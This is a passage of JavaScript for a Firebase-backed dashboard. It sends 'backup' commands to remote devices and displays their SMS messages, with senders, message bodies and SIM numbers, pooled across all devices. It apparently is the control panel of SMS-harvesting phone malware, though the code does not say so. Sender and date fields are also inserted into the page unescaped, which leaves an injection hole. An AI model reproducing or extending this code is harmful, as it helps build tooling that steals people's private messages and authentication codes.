        statusEl.className = 'status-value success';
    } else if (st === 'in_progress' || st === 'pending') {
        statusEl.textContent = '⏳ ' + (msg || 'In progress...');
        statusEl.className = 'status-value pending';
    } else if (st === 'failed' || st === 'error') {
        statusEl.textContent = '❌ ' + (msg || 'Backup failed');
        statusEl.className = 'status-value failed';
    } else {
        statusEl.textContent = '📊 ' + (msg || 'No backup');
        statusEl.className = 'status-value';
    }

    const last = info.last_backup_time || info.timestamp || null;
    $('backupLastTime').textContent = last ? new Date(last).toLocaleString() : 'Never';

    const count = info.latest_backup_count || info.sms_count || 0;
    $('backupSmsCount').textContent = count + ' SMS';

    $('backupId').textContent = info.backup_id || status.backup_id || 'N/A';

    const badge = $('backupStatusBadge');
    badge.textContent = st === 'success' ? '✅ Ready' : '⏳ Pending';
}

function triggerBackup() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    triggerDeviceBackup(devId);
}

function triggerDeviceBackup(devId) {
    if (!devId) return;
    $('backupStatusValue').textContent = '⏳ Sending...';
    $('backupStatusValue').className = 'status-value pending';

    db.ref(`user_data/${devId}`).update({
        device: devId,
        command: 'backup',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Backup command sent to ${devId}`, 'success');
        setTimeout(refreshBackupStatus, 3000);
    }).catch(() => {
        $('backupStatusValue').textContent = '❌ Failed';
        $('backupStatusValue').className = 'status-value failed';
        showToast('❌ Failed to send', 'error');
    });
}

function refreshBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');

    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        if (snap.exists()) {
            if (!cachedData.user_data) cachedData.user_data = {};
            if (!cachedData.user_data[devId]) cachedData.user_data[devId] = {};
            cachedData.user_data[devId].backup_status = snap.val();
        }
        updateBackupStatusDisplay(devId);
        loadBackupSmsForDevice(devId);
        showToast('✅ Status refreshed', 'success');
    }).catch(() => showToast('❌ Failed', 'error'));
}

function refreshDeviceBackup(devId) {
    const div = document.getElementById(`deviceBackup-${devId}`);
    if (!div) return;
    div.innerHTML = '⏳ Checking...';

    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        let html = '';
        if (snap.exists()) {
            const data = snap.val();
            const st = data.backup_status || 'Unknown';
            const msg = data.backup_message || '';
            let color = 'var(--text-muted)';
            let icon = '📊';
            if (st === 'success') { color = 'var(--green)';
                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b';
                icon = '⏳'; } else if (st === 'failed' || st === 'error') { color = 'var(--red)';
                icon = '❌'; }
            html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;

            db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
                if (infoSnap.exists()) {
                    const info = infoSnap.val();
                    const count = info.latest_backup_count || info.sms_count || 0;
                    const last = info.last_backup_time || info.timestamp || null;
                    html += `<div style="font-size:10px;color:var(--text-muted);margin-top:3px;">📨 ${count} SMS | ${last ? '📅 ' + new Date(last).toLocaleString() : 'No time'}</div>`;
                }
                div.innerHTML = html;
            });
        } else {
            div.innerHTML = '📊 No backup status';
        }
    }).catch(() => {
        div.innerHTML = '❌ Error loading';
    });
}

function clearBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    if (!confirm(`Clear backup status for ${devId}?`)) return;

    db.ref(`user_data/${devId}/backup_status`).remove().then(() => {
        db.ref(`user_data/${devId}/backup_info`).remove().then(() => {
            showToast(`✅ Cleared for ${devId}`, 'success');
            updateBackupStatusDisplay(devId);
            loadBackupSmsForDevice(devId);
        });
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// LOAD BACKUP SMS FOR DEVICE
// ============================================================
function loadBackupSmsForDevice(devId) {
    const container = $('backupSmsList');
    if (!devId) {
        container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
        return;
    }

    const backupData = cachedData.backup_sms;
    if (backupData && backupData[devId]) {
        renderBackupSmsList(container, backupData[devId]);
        return;
    }

    container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';

    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            renderBackupSmsList(container, snap.val());
        } else {
            container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
        }
    }).catch(() => {
        container.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderBackupSmsList(container, data) {
    const messages = [];
    Object.keys(data).forEach(key => {
        messages.push({ key, ...data[key] });
    });
    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

    if (messages.length === 0) {
        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
        return;
    }

    container.innerHTML = messages.map(msg => `
        <div class="backup-sms-item">
            <div class="sms-header">
                <span class="sender">👤 ${msg.sender || msg.address || 'Unknown'}</span>
                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
            </div>
        </div>
    `).join('');
}

// ============================================================
// OPEN BACKUP SMS MODAL
// ============================================================
function openBackupSmsModal() {
    const modal = $('backupSmsModal');
    const body = $('backupModalBody');
    const title = $('backupModalTitle');

    title.textContent = '💾 All Backup Messages';
    body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
    modal.classList.add('open');

    const backupData = cachedData.backup_sms;
    if (backupData) {
        renderAllBackupSms(body, backupData);
        return;
    }

    db.ref('backup_sms').once('value').then(snap => {
        if (snap.exists()) {
            renderAllBackupSms(body, snap.val());
        } else {
            body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No backup messages</div>';
        }
    }).catch(() => {
        body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderAllBackupSms(container, data) {
    let allMsgs = [];
    Object.keys(data).forEach(devId => {
        const devMsgs = data[devId];
        Object.keys(devMsgs).forEach(key => {
            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
        });
    });
    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

    if (allMsgs.length === 0) {
        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
        return;
    }

    container.innerHTML = allMsgs.map(msg => `
        <div class="backup-sms-item">
            <div class="sms-header">
                <span class="sender">
                    <span style="color:var(--gold-light);font-size:10px;">[${msg.deviceId}]</span>
                    👤 ${msg.sender || msg.address || 'Unknown'}
                </span>
                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
            </div>
        </div>
    `).join('');
}

function closeBackupSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    $('backupSmsModal').classList.remove('open');
}

// ============================================================
// MODAL FUNCTIONS
// ============================================================
function openSmsModal(target) {
    modalTarget = target;
    modalSmsOffset = 0;
    modalSmsList = [];

    const smsData = cachedData.user_sms || {};
    if (target === 'ALL') {
        $('modalTitle').textContent = '📩 All Messages';
        Object.keys(smsData).forEach(devId => {
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                modalSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
    } else {
        $('modalTitle').textContent = `📩 Messages for ${target}`;
        if (smsData[target]) {
            Object.keys(smsData[target]).forEach(k => {
                modalSmsList.push(smsData[target][k]);
            });
        }
    }

    modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    renderModalSms();
    $('smsModal').classList.add('open');
}

function renderModalSms() {
    const body = $('modalBody');
    const loadMore = $('modalLoadMore');

    const start = modalSmsOffset;
    const end = Math.min(start + SMS_LIMIT, modalSmsList.length);
    const paginated = modalSmsList.slice(start, end);

    if (modalSmsOffset === 0) {
        body.innerHTML = renderSmsCards(paginated, modalTarget === 'ALL');
    } else {
        body.innerHTML += renderSmsCards(paginated, modalTarget === 'ALL');
    }

    if (end < modalSmsList.length) {
        loadMore.style.display = 'block';
        loadMore.textContent = `📥 Load More (${modalSmsList.length - end} remaining)`;
    } else {
        loadMore.style.display = 'none';
    }
}

function loadMoreModalSms() {
    modalSmsOffset += SMS_LIMIT;
    renderModalSms();
}

function closeSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    $('smsModal').classList.remove('open');
}

// ============================================================
// TOAST
// ============================================================
function showToast(message, type = 'info', duration = 2800) {
    const container = $('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast-luxury ${type}`;
    toast.textContent = message;
    container.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, duration);
}

// ============================================================
// UTILITY
// ============================================================
function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ============================================================
// BACKUP DEVICE SELECT LISTENER
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    $('backupDeviceSelect').addEventListener('change', function() {
        const id = this.value;
        if (id) {
            updateBackupStatusDisplay(id);
            loadBackupSmsForDevice(id);
            refreshDeviceBackup(id);
        } else {
            $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
        }
    });

    $('filterAll').classList.add('active');
});